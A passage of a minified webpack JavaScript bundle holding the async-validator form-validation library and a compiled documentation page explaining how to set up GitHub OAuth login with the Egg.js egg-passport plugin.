(function(e){var t={};function n(a){if(t[a])return t[a].exports;var r=t[a]={i:a,l:!1,exports:{}};return e[a].call(r.exports,r,r.exports,n),r.l=!0,r.exports}n.m=e,n.c=t,n.d=function(e,t,a){n.o(e,t)||Object.defineProperty(e,t,{enumerable:!0,get:a})},n.r=function(e){"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})},n.t=function(e,t){if(1&t&&(e=n(e)),8&t)return e;if(4&t&&"object"===typeof e&&e&&e.__esModule)return e;var a=Object.create(null);if(n.r(a),Object.defineProperty(a,"default",{enumerable:!0,value:e}),2&t&&"string"!=typeof e)for(var r in e)n.d(a,r,function(t){return e[t]}.bind(null,r));return a},n.n=function(e){var t=e&&e.__esModule?function(){return e["default"]}:function(){return e};return n.d(t,"a",t),t},n.o=function(e,t){return Object.prototype.hasOwnProperty.call(e,t)},n.p="/",n(n.s=0)})({"+/y7":function(e,t,n){"use strict";(function(e){function a(){return a=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var a in n)Object.prototype.hasOwnProperty.call(n,a)&&(e[a]=n[a])}return e},a.apply(this,arguments)}function r(e,t){e.prototype=Object.create(t.prototype),e.prototype.constructor=e,o(e,t)}function l(e){return l=Object.setPrototypeOf?Object.getPrototypeOf.bind():function(e){return e.__proto__||Object.getPrototypeOf(e)},l(e)}function o(e,t){return o=Object.setPrototypeOf?Object.setPrototypeOf.bind():function(e,t){return e.__proto__=t,e},o(e,t)}function i(){if("undefined"===typeof Reflect||!Reflect.construct)return!1;if(Reflect.construct.sham)return!1;if("function"===typeof Proxy)return!0;try{return Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],(function(){}))),!0}catch(e){return!1}}function c(e,t,n){return c=i()?Reflect.construct.bind():function(e,t,n){var a=[null];a.push.apply(a,t);var r=Function.bind.apply(e,a),l=new r;return n&&o(l,n.prototype),l},c.apply(null,arguments)}function s(e){return-1!==Function.toString.call(e).indexOf("[native code]")}function u(e){var t="function"===typeof Map?new Map:void 0;return u=function(e){if(null===e||!s(e))return e;if("function"!==typeof e)throw new TypeError("Super expression must either be null or a function");if("undefined"!==typeof t){if(t.has(e))return t.get(e);t.set(e,n)}function n(){return c(e,arguments,l(this).constructor)}return n.prototype=Object.create(e.prototype,{constructor:{value:n,enumerable:!1,writable:!0,configurable:!0}}),o(n,e)},u(e)}n.d(t,"a",(function(){return ae}));var d=/%[sdj%]/g,m=function(){};function p(e){if(!e||!e.length)return null;var t={};return e.forEach((function(e){var n=e.field;t[n]=t[n]||[],t[n].push(e)})),t}function h(e){for(var t=arguments.length,n=new Array(t>1?t-1:0),a=1;a<t;a++)n[a-1]=arguments[a];var r=0,l=n.length;if("function"===typeof e)return e.apply(null,n);if("string"===typeof e){var o=e.replace(d,(function(e){if("%%"===e)return"%";if(r>=l)return e;switch(e){case"%s":return String(n[r++]);case"%d":return Number(n[r++]);case"%j":try{return JSON.stringify(n[r++])}catch(t){return"[Circular]"}break;default:return e}}));return o}return e}function g(e){return"string"===e||"url"===e||"hex"===e||"email"===e||"date"===e||"pattern"===e}function f(e,t){return void 0===e||null===e||(!("array"!==t||!Array.isArray(e)||e.length)||!(!g(t)||"string"!==typeof e||e))}function E(e,t,n){var a=[],r=0,l=e.length;function o(e){a.push.apply(a,e||[]),r++,r===l&&n(a)}e.forEach((function(e){t(e,o)}))}function b(e,t,n){var a=0,r=e.length;function l(o){if(o&&o.length)n(o);else{var i=a;a+=1,i<r?t(e[i],l):n([])}}l([])}function v(e){var t=[];return Object.keys(e).forEach((function(n){t.push.apply(t,e[n]||[])})),t}"undefined"!==typeof e&&Object({NODE_ENV:"production"});var y=function(e){function t(t,n){var a;return a=e.call(this,"Async Validation Error")||this,a.errors=t,a.fields=n,a}return r(t,e),t}(u(Error));function k(e,t,n,a,r){if(t.first){var l=new Promise((function(t,l){var o=function(e){return a(e),e.length?l(new y(e,p(e))):t(r)},i=v(e);b(i,n,o)}));return l["catch"]((function(e){return e})),l}var o=!0===t.firstFields?Object.keys(e):t.firstFields||[],i=Object.keys(e),c=i.length,s=0,u=[],d=new Promise((function(t,l){var d=function(e){if(u.push.apply(u,e),s++,s===c)return a(u),u.length?l(new y(u,p(u))):t(r)};i.length||(a(u),t(r)),i.forEach((function(t){var a=e[t];-1!==o.indexOf(t)?b(a,n,d):E(a,n,d)}))}));return d["catch"]((function(e){return e})),d}function w(e){return!(!e||void 0===e.message)}function x(e,t){for(var n=e,a=0;a<t.length;a++){if(void 0==n)return n;n=n[t[a]]}return n}function j(e,t){return function(n){var a;return a=e.fullFields?x(t,e.fullFields):t[n.field||e.fullField],w(n)?(n.field=n.field||e.fullField,n.fieldValue=a,n):{message:"function"===typeof n?n():n,fieldValue:a,field:n.field||e.fullField}}}function S(e,t){if(t)for(var n in t)if(t.hasOwnProperty(n)){var r=t[n];"object"===typeof r&&"object"===typeof e[n]?e[n]=a({},e[n],r):e[n]=r}return e}var C,A=function(e,t,n,a,r,l){!e.required||n.hasOwnProperty(e.field)&&!f(t,l||e.type)||a.push(h(r.messages.required,e.fullField))},L=function(e,t,n,a,r){(/^\s+$/.test(t)||""===t)&&a.push(h(r.messages.whitespace,e.fullField))},T=function(){if(C)return C;var e="[a-fA-F\\d:]",t=function(t){return t&&t.includeBoundaries?"(?:(?<=\\s|^)(?="+e+")|(?<="+e+")(?=\\s|$))":""},n="(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)(?:\\.(?:25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]\\d|\\d)){3}",a="[a-fA-F\\d]{1,4}",r=("\n(?:\n(?:"+a+":){7}(?:"+a+"|:)|                                    // 1:2:3:4:5:6:7::  1:2:3:4:5:6:7:8\n(?:"+a+":){6}(?:"+n+"|:"+a+"|:)|                             // 1:2:3:4:5:6::    1:2:3:4:5:6::8   1:2:3:4:5:6::8  1:2:3:4:5:6::1.2.3.4\n(?:"+a+":){5}(?::"+n+"|(?::"+a+"){1,2}|:)|                   // 1:2:3:4:5::      1:2:3:4:5::7:8   1:2:3:4:5::8    1:2:3:4:5::7:1.2.3.4\n(?:"+a+":){4}(?:(?::"+a+"){0,1}:"+n+"|(?::"+a+"){1,3}|:)| // 1:2:3:4::        1:2:3:4::6:7:8   1:2:3:4::8      1:2:3:4::6:7:1.2.3.4\n(?:"+a+":){3}(?:(?::"+a+"){0,2}:"+n+"|(?::"+a+"){1,4}|:)| // 1:2:3::          1:2:3::5:6:7:8   1:2:3::8        1:2:3::5:6:7:1.2.3.4\n(?:"+a+":){2}(?:(?::"+a+"){0,3}:"+n+"|(?::"+a+"){1,5}|:)| // 1:2::            1:2::4:5:6:7:8   1:2::8          1:2::4:5:6:7:1.2.3.4\n(?:"+a+":){1}(?:(?::"+a+"){0,4}:"+n+"|(?::"+a+"){1,6}|:)| // 1::              1::3:4:5:6:7:8   1::8            1::3:4:5:6:7:1.2.3.4\n(?::(?:(?::"+a+"){0,5}:"+n+"|(?::"+a+"){1,7}|:))             // ::2:3:4:5:6:7:8  ::2:3:4:5:6:7:8  ::8             ::1.2.3.4\n)(?:%[0-9a-zA-Z]{1,})?                                             // %eth0            %1\n").replace(/\s*\/\/.*$/gm,"").replace(/\n/g,"").trim(),l=new RegExp("(?:^"+n+"$)|(?:^"+r+"$)"),o=new RegExp("^"+n+"$"),i=new RegExp("^"+r+"$"),c=function(e){return e&&e.exact?l:new RegExp("(?:"+t(e)+n+t(e)+")|(?:"+t(e)+r+t(e)+")","g")};c.v4=function(e){return e&&e.exact?o:new RegExp(""+t(e)+n+t(e),"g")},c.v6=function(e){return e&&e.exact?i:new RegExp(""+t(e)+r+t(e),"g")};var s="(?:(?:[a-z]+:)?//)",u="(?:\\S+(?::\\S*)?@)?",d=c.v4().source,m=c.v6().source,p="(?:(?:[a-z\\u00a1-\\uffff0-9][-_]*)*[a-z\\u00a1-\\uffff0-9]+)",h="(?:\\.(?:[a-z\\u00a1-\\uffff0-9]-*)*[a-z\\u00a1-\\uffff0-9]+)*",g="(?:\\.(?:[a-z\\u00a1-\\uffff]{2,}))",f="(?::\\d{2,5})?",E='(?:[/?#][^\\s"]*)?',b="(?:"+s+"|www\\.)"+u+"(?:localhost|"+d+"|"+m+"|"+p+h+g+")"+f+E;return C=new RegExp("(?:^"+b+"$)","i"),C},N={email:/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+\.)+[a-zA-Z\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]{2,}))$/,hex:/^#?([a-f0-9]{6}|[a-f0-9]{3})$/i},O={integer:function(e){return O.number(e)&&parseInt(e,10)===e},float:function(e){return O.number(e)&&!O.integer(e)},array:function(e){return Array.isArray(e)},regexp:function(e){if(e instanceof RegExp)return!0;try{return!!new RegExp(e)}catch(t){return!1}},date:function(e){return"function"===typeof e.getTime&&"function"===typeof e.getMonth&&"function"===typeof e.getYear&&!isNaN(e.getTime())},number:function(e){return!isNaN(e)&&"number"===typeof e},object:function(e){return"object"===typeof e&&!O.array(e)},method:function(e){return"function"===typeof e},email:function(e){return"string"===typeof e&&e.length<=320&&!!e.match(N.email)},url:function(e){return"string"===typeof e&&e.length<=2048&&!!e.match(T())},hex:function(e){return"string"===typeof e&&!!e.match(N.hex)}},I=function(e,t,n,a,r){if(e.required&&void 0===t)A(e,t,n,a,r);else{var l=["integer","float","array","regexp","object","method","email","number","date","url","hex"],o=e.type;l.indexOf(o)>-1?O[o](t)||a.push(h(r.messages.types[o],e.fullField,e.type)):o&&typeof t!==e.type&&a.push(h(r.messages.types[o],e.fullField,e.type))}},P=function(e,t,n,a,r){var l="number"===typeof e.len,o="number"===typeof e.min,i="number"===typeof e.max,c=/[\uD800-\uDBFF][\uDC00-\uDFFF]/g,s=t,u=null,d="number"===typeof t,m="string"===typeof t,p=Array.isArray(t);if(d?u="number":m?u="string":p&&(u="array"),!u)return!1;p&&(s=t.length),m&&(s=t.replace(c,"_").length),l?s!==e.len&&a.push(h(r.messages[u].len,e.fullField,e.len)):o&&!i&&s<e.min?a.push(h(r.messages[u].min,e.fullField,e.min)):i&&!o&&s>e.max?a.push(h(r.messages[u].max,e.fullField,e.max)):o&&i&&(s<e.min||s>e.max)&&a.push(h(r.messages[u].range,e.fullField,e.min,e.max))},R="enum",_=function(e,t,n,a,r){e[R]=Array.isArray(e[R])?e[R]:[],-1===e[R].indexOf(t)&&a.push(h(r.messages[R],e.fullField,e[R].join(", ")))},q=function(e,t,n,a,r){if(e.pattern)if(e.pattern instanceof RegExp)e.pattern.lastIndex=0,e.pattern.test(t)||a.push(h(r.messages.pattern.mismatch,e.fullField,t,e.pattern));else if("string"===typeof e.pattern){var l=new RegExp(e.pattern);l.test(t)||a.push(h(r.messages.pattern.mismatch,e.fullField,t,e.pattern))}},M={required:A,whitespace:L,type:I,range:P,enum:_,pattern:q},F=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(f(t,"string")&&!e.required)return n();M.required(e,t,a,l,r,"string"),f(t,"string")||(M.type(e,t,a,l,r),M.range(e,t,a,l,r),M.pattern(e,t,a,l,r),!0===e.whitespace&&M.whitespace(e,t,a,l,r))}n(l)},D=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(f(t)&&!e.required)return n();M.required(e,t,a,l,r),void 0!==t&&M.type(e,t,a,l,r)}n(l)},U=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(""===t&&(t=void 0),f(t)&&!e.required)return n();M.required(e,t,a,l,r),void 0!==t&&(M.type(e,t,a,l,r),M.range(e,t,a,l,r))}n(l)},z=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(f(t)&&!e.required)return n();M.required(e,t,a,l,r),void 0!==t&&M.type(e,t,a,l,r)}n(l)},H=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(f(t)&&!e.required)return n();M.required(e,t,a,l,r),f(t)||M.type(e,t,a,l,r)}n(l)},B=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(f(t)&&!e.required)return n();M.required(e,t,a,l,r),void 0!==t&&(M.type(e,t,a,l,r),M.range(e,t,a,l,r))}n(l)},W=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(f(t)&&!e.required)return n();M.required(e,t,a,l,r),void 0!==t&&(M.type(e,t,a,l,r),M.range(e,t,a,l,r))}n(l)},V=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if((void 0===t||null===t)&&!e.required)return n();M.required(e,t,a,l,r,"array"),void 0!==t&&null!==t&&(M.type(e,t,a,l,r),M.range(e,t,a,l,r))}n(l)},$=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(f(t)&&!e.required)return n();M.required(e,t,a,l,r),void 0!==t&&M.type(e,t,a,l,r)}n(l)},G="enum",X=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(f(t)&&!e.required)return n();M.required(e,t,a,l,r),void 0!==t&&M[G](e,t,a,l,r)}n(l)},Q=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(f(t,"string")&&!e.required)return n();M.required(e,t,a,l,r),f(t,"string")||M.pattern(e,t,a,l,r)}n(l)},K=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(f(t,"date")&&!e.required)return n();var i;if(M.required(e,t,a,l,r),!f(t,"date"))i=t instanceof Date?t:new Date(t),M.type(e,i,a,l,r),i&&M.range(e,i.getTime(),a,l,r)}n(l)},J=function(e,t,n,a,r){var l=[],o=Array.isArray(t)?"array":typeof t;M.required(e,t,a,l,r,o),n(l)},Y=function(e,t,n,a,r){var l=e.type,o=[],i=e.required||!e.required&&a.hasOwnProperty(e.field);if(i){if(f(t,l)&&!e.required)return n();M.required(e,t,a,o,r,l),f(t,l)||M.type(e,t,a,o,r)}n(o)},Z=function(e,t,n,a,r){var l=[],o=e.required||!e.required&&a.hasOwnProperty(e.field);if(o){if(f(t)&&!e.required)return n();M.required(e,t,a,l,r)}n(l)},ee={string:F,method:D,number:U,boolean:z,regexp:H,integer:B,float:W,array:V,object:$,enum:X,pattern:Q,date:K,url:Y,hex:Y,email:Y,required:J,any:Z};function te(){return{default:"Validation error on field %s",required:"%s is required",enum:"%s must be one of %s",whitespace:"%s cannot be empty",date:{format:"%s date %s is invalid for format %s",parse:"%s date could not be parsed, %s is invalid ",invalid:"%s date %s is invalid"},types:{string:"%s is not a %s",method:"%s is not a %s (function)",array:"%s is not an %s",object:"%s is not an %s",number:"%s is not a %s",date:"%s is not a %s",boolean:"%s is not a %s",integer:"%s is not an %s",float:"%s is not a %s",regexp:"%s is not a valid %s",email:"%s is not a valid %s",url:"%s is not a valid %s",hex:"%s is not a valid %s"},string:{len:"%s must be exactly %s characters",min:"%s must be at least %s characters",max:"%s cannot be longer than %s characters",range:"%s must be between %s and %s characters"},number:{len:"%s must equal %s",min:"%s cannot be less than %s",max:"%s cannot be greater than %s",range:"%s must be between %s and %s"},array:{len:"%s must be exactly %s in length",min:"%s cannot be less than %s in length",max:"%s cannot be greater than %s in length",range:"%s must be between %s and %s in length"},pattern:{mismatch:"%s value %s does not match pattern %s"},clone:function(){var e=JSON.parse(JSON.stringify(this));return e.clone=this.clone,e}}}var ne=te(),ae=function(){function e(e){this.rules=null,this._messages=ne,this.define(e)}var t=e.prototype;return t.define=function(e){var t=this;if(!e)throw new Error("Cannot configure a schema with no rules");if("object"!==typeof e||Array.isArray(e))throw new Error("Rules must be an object");this.rules={},Object.keys(e).forEach((function(n){var a=e[n];t.rules[n]=Array.isArray(a)?a:[a]}))},t.messages=function(e){return e&&(this._messages=S(te(),e)),this._messages},t.validate=function(t,n,r){var l=this;void 0===n&&(n={}),void 0===r&&(r=function(){});var o=t,i=n,c=r;if("function"===typeof i&&(c=i,i={}),!this.rules||0===Object.keys(this.rules).length)return c&&c(null,o),Promise.resolve(o);function s(e){var t=[],n={};function a(e){var n;Array.isArray(e)?t=(n=t).concat.apply(n,e):t.push(e)}for(var r=0;r<e.length;r++)a(e[r]);t.length?(n=p(t),c(t,n)):c(null,o)}if(i.messages){var u=this.messages();u===ne&&(u=te()),S(u,i.messages),i.messages=u}else i.messages=this.messages();var d={},m=i.keys||Object.keys(this.rules);m.forEach((function(e){var n=l.rules[e],r=o[e];n.forEach((function(n){var i=n;"function"===typeof i.transform&&(o===t&&(o=a({},o)),r=o[e]=i.transform(r)),i="function"===typeof i?{validator:i}:a({},i),i.validator=l.getValidationMethod(i),i.validator&&(i.field=e,i.fullField=i.fullField||e,i.type=l.getType(i),d[e]=d[e]||[],d[e].push({rule:i,value:r,source:o,field:e}))}))}));var g={};return k(d,i,(function(t,n){var r,l=t.rule,c=("object"===l.type||"array"===l.type)&&("object"===typeof l.fields||"object"===typeof l.defaultField);function s(e,t){return a({},t,{fullField:l.fullField+"."+e,fullFields:l.fullFields?[].concat(l.fullFields,[e]):[e]})}function u(r){void 0===r&&(r=[]);var u=Array.isArray(r)?r:[r];!i.suppressWarning&&u.length&&e.warning("async-validator:",u),u.length&&void 0!==l.message&&(u=[].concat(l.message));var d=u.map(j(l,o));if(i.first&&d.length)return g[l.field]=1,n(d);if(c){if(l.required&&!t.value)return void 0!==l.message?d=[].concat(l.message).map(j(l,o)):i.error&&(d=[i.error(l,h(i.messages.required,l.field))]),n(d);var m={};l.defaultField&&Object.keys(t.value).map((function(e){m[e]=l.defaultField})),m=a({},m,t.rule.fields);var p={};Object.keys(m).forEach((function(e){var t=m[e],n=Array.isArray(t)?t:[t];p[e]=n.map(s.bind(null,e))}));var f=new e(p);f.messages(i.messages),t.rule.options&&(t.rule.options.messages=i.messages,t.rule.options.error=i.error),f.validate(t.value,t.rule.options||i,(function(e){var t=[];d&&d.length&&t.push.apply(t,d),e&&e.length&&t.push.apply(t,e),n(t.length?t:null)}))}else n(d)}if(c=c&&(l.required||!l.required&&t.value),l.field=t.field,l.asyncValidator)r=l.asyncValidator(l,t.value,u,t.source,i);else if(l.validator){try{r=l.validator(l,t.value,u,t.source,i)}catch(d){null==console.error||console.error(d),i.suppressValidatorError||setTimeout((function(){throw d}),0),u(d.message)}!0===r?u():!1===r?u("function"===typeof l.message?l.message(l.fullField||l.field):l.message||(l.fullField||l.field)+" fails"):r instanceof Array?u(r):r instanceof Error&&u(r.message)}r&&r.then&&r.then((function(){return u()}),(function(e){return u(e)}))}),(function(e){s(e)}),o)},t.getType=function(e){if(void 0===e.type&&e.pattern instanceof RegExp&&(e.type="pattern"),"function"!==typeof e.validator&&e.type&&!ee.hasOwnProperty(e.type))throw new Error(h("Unknown rule type %s",e.type));return e.type||"string"},t.getValidationMethod=function(e){if("function"===typeof e.validator)return e.validator;var t=Object.keys(e),n=t.indexOf("message");return-1!==n&&t.splice(n,1),1===t.length&&"required"===t[0]?ee.required:ee[this.getType(e)]||void 0},e}();ae.register=function(e,t){if("function"!==typeof t)throw new Error("Cannot register a validator by type, validator is not a function");ee[e]=t},ae.warning=m,ae.messages=ne,ae.validators=ee}).call(this,n("B0ME"))},"+0HW":function(e,t,n){var a=n("rdCR"),r=n("AaXQ"),l=n("q7Pv"),o=l("toStringTag"),i="Arguments"==r(function(){return arguments}()),c=function(e,t){try{return e[t]}catch(n){}};e.exports=a?r:function(e){var t,n,a;return void 0===e?"Undefined":null===e?"Null":"string"==typeof(n=c(t=Object(e),o))?n:i?r(t):"Object"==(a=r(t))&&"function"==typeof t.callee?"Arguments":a}},"+3ML":function(e,t,n){var a=n("0mt+"),r=n("V3tB"),l=n("XaNN"),o=n("oyD1"),i=n("Xdqv"),c=r("Reflect","apply"),s=Function.apply,u=!i((function(){c((function(){}))}));a({target:"Reflect",stat:!0,forced:u},{apply:function(e,t,n){return l(e),o(n),c?c(e,t,n):s.call(e,t,n)}})},"+7qM":function(e,t,n){var a=n("vyxk");e.exports=function(e){if(a(e))throw TypeError("The method doesn't accept regular expressions");return e}},"+ONy":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,r.a.createElement("strong",null,r.a.createElement("code",null,"Login authentication")),' is a common business scenario, including "account password login" and "third-party unified login".'),r.a.createElement("p",null,"Among them, we often use the latter, such as Google, GitHub, QQ unified login, which are based on ",r.a.createElement(l["Link"],{to:"https://oauth.net/2/"},"OAuth")," specification."),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://www.passportjs.org/"},"Passport")," is a highly scalable authentication middleware that supports the ",r.a.createElement("code",null,"Strategy")," of ",r.a.createElement("code",null,"Github")," ,",r.a.createElement("code",null,"Twitter"),",",r.a.createElement("code",null,"Facebook"),", and other well-known service vendors. It also supports login authorization verification via account passwords."),r.a.createElement("p",null,"Egg provides an ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-passport"},"egg-passport")," plugin which encapsulates general logic such as callback processing after initialization and the success of authentication so that the developers can use Passport with just a few API calls."),r.a.createElement("p",null,"The execution sequence of ",r.a.createElement(l["Link"],{to:"http://www.passportjs.org/"},"Passport")," is as follows:"),r.a.createElement("ul",null,r.a.createElement("li",null,"User accesses page"),r.a.createElement("li",null,"Check Session"),r.a.createElement("li",null,"Intercept and jump to authentication login page"),r.a.createElement("li",null,"Strategy Authentication"),r.a.createElement("li",null,"Check and store user information"),r.a.createElement("li",null,"Serialize user information to Session"),r.a.createElement("li",null,"Jump to the specified page")),r.a.createElement("h2",{id:"using-egg-passport"},r.a.createElement(l["AnchorLink"],{to:"#using-egg-passport","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using ",r.a.createElement("code",null,"egg-passport")),r.a.createElement("p",null,"Below, we will use GitHub login as an example to demonstrate how to use it."),r.a.createElement("h3",{id:"installation"},r.a.createElement(l["AnchorLink"],{to:"#installation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Installation"),r.a.createElement(o["a"],{code:"$ npm i --save egg-passport\n$ npm i --save egg-passport-github",lang:"bash"}),r.a.createElement("p",null,"For more plugins, see ",r.a.createElement(l["Link"],{to:"https://github.com/topics/egg-passport"},"GitHub Topic - egg-passport")," ."),r.a.createElement("h3",{id:"configuration"},r.a.createElement(l["AnchorLink"],{to:"#configuration","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Configuration"),r.a.createElement("p",null,r.a.createElement("strong",null,"Enabling the plugin:")),r.a.createElement(o["a"],{code:"// config/plugin.js\nmodule.exports.passport = {\n  enable: true,\n  package: 'egg-passport',\n};\n\nmodule.exports.passportGithub = {\n  enable: true,\n  package: 'egg-passport-github',\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Configuration:")),r.a.createElement("p",null,"Note: The ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-passport"},"egg-passport")," standardizes the configuration fields, which are unified as ",r.a.createElement("code",null,"key")," and ",r.a.createElement("code",null,"secret"),"."),r.a.createElement(o["a"],{code:"// config/default.js\nconfig.passportGithub = {\n  key: 'your_clientID',\n  secret: 'your_clientSecret',\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Note:")),r.a.createElement("ul",null,r.a.createElement("li",null,"Create a ",r.a.createElement(l["Link"],{to:"https://github.com/settings/applications/new"},"GitHub OAuth Apps")," to get the ",r.a.createElement("code",null,"clientID")," and ",r.a.createElement("code",null,"clientSecret")," information."),r.a.createElement("li",null,"Specify a ",r.a.createElement("code",null,"callbackURL"),", such as ",r.a.createElement("code",null,"http://127.0.0.1:7001/passport/github/callback"),"\xa0\xa0- You need to update to the corresponding domain name when deploying online \xa0\xa0- The path is configured via ",r.a.createElement("code",null,"options.callbackURL"),", which defaults to ",r.a.createElement("code",null,"/passport/$","{","strategy","}","/callback"))),r.a.createElement("h3",{id:"mounting-routes"},r.a.createElement(l["AnchorLink"],{to:"#mounting-routes","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mounting Routes"),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app; // Mount the authentication route\n\n  app.passport.mount('github'); // The mount above is syntactic sugar, which is equivalent to // const github = app.passport.authenticate('github', {}); // router.get('/passport/github', github); // router.get('/passport/github/callback', github);\n};",lang:"js"}),r.a.createElement("h3",{id:"user-information-processing"},r.a.createElement(l["AnchorLink"],{to:"#user-information-processing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"User Information Processing"),r.a.createElement("p",null,"Then we also need:"),r.a.createElement("ul",null,r.a.createElement("li",null,"When signing in for the first time, you generally need to put user information into the repository and record the Session."),r.a.createElement("li",null,"In the second login, the user information obtained from OAuth or Session, and the database is read to get the complete user information.")),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.passport.verify(async (ctx, user) => {\n    // Check user\n    assert(user.provider, 'user.provider should exists');\n    assert(user.id, 'user.id should exists'); // Find user information from the database // // Authorization Table // column   | desc // ---      | -- // provider | provider name, like github, twitter, facebook, weibo and so on // uid      | provider unique id // user_id  | current application user id\n\n    const auth = await ctx.model.Authorization.findOne({\n      uid: user.id,\n      provider: user.provider,\n    });\n    const existsUser = await ctx.model.User.findOne({ id: auth.user_id });\n    if (existsUser) {\n      return existsUser;\n    } // Call service to register a new user\n    const newUser = await ctx.service.user.register(user);\n    return newUser;\n  }); // Serialize and store the user information into session. Generally, only a few fields need to be streamlined/saved.\n\n  app.passport.serializeUser(async (ctx, user) => {\n    // process user\n    // ...\n    // return user;\n  }); // Deserialize the user information from the session, check the database to get the complete information\n\n  app.passport.deserializeUser(async (ctx, user) => {\n    // process user\n    // ...\n    // return user;\n  });\n};",lang:"js"}),r.a.createElement("p",null,"At this point, we have completed all the configurations. For a complete example, see: ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/passport"},"eggjs/examples/passport")),r.a.createElement("h3",{id:"api"},r.a.createElement(l["AnchorLink"],{to:"#api","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"API"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-passport"},"egg-passport")," provides the following extensions:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"ctx.user")," - Get current logged in user information"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.isAuthenticated()")," - Check if the request is authorized"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.login(user, [options])")," - Start a login session for the user"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.logout()")," - Exit and clear user information from session"),r.a.createElement("li",null,r.a.createElement("code",null,"ctx.session.returnTo=")," - Set redirect address after authentication page success")),r.a.createElement("p",null,"The API also be provided for:"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.verify(async (ctx, user) => ","{","}",")")," - Check user"),r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.serializeUser(async (ctx, user) => ","{","}",")")," - Serialize user information into session"),r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.deserializeUser(async (ctx, user) => ","{","}",")")," - Deserialize user information from the session"),r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.authenticate(strategy, options)")," - Generate the specified authentication middleware \xa0\xa0- ",r.a.createElement("code",null,"options.successRedirect")," - specifies the redirect address after successful authentication \xa0\xa0- ",r.a.createElement("code",null,"options.loginURL")," - jump login address, defaults to ",r.a.createElement("code",null,"/passport/$","{","strategy","}"),"\xa0\xa0- ",r.a.createElement("code",null,"options.callbackURL")," - callback address after authorization, defaults to ",r.a.createElement("code",null,"/passport/$","{","strategy","}","/callback")),r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.mount(strategy, options)")," - Syntactic sugar for developers to configure routing")),r.a.createElement("p",null,r.a.createElement("strong",null,"Note:")),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app.passport.authenticate"),", if ",r.a.createElement("code",null,"options.successRedirect")," or ",r.a.createElement("code",null,"options.successReturnToOrRedirect")," is null, it will redirect to ",r.a.createElement("code",null,"/")," by default")),r.a.createElement("h2",{id:"using-passport-ecosystem"},r.a.createElement(l["AnchorLink"],{to:"#using-passport-ecosystem","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Using Passport Ecosystem"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://www.passportjs.org/"},"Passport")," has many middleware and it is impossible to have the second encapsulation. Next, let's look at how to use Passport middleware directly in the framework. We will use ",r.a.createElement(l["Link"],{to:"https://github.com/jaredhanson/passport-local"},"passport-local"),' for "account password login" as an example:'),r.a.createElement("h3",{id:"installation-1"},r.a.createElement(l["AnchorLink"],{to:"#installation-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon 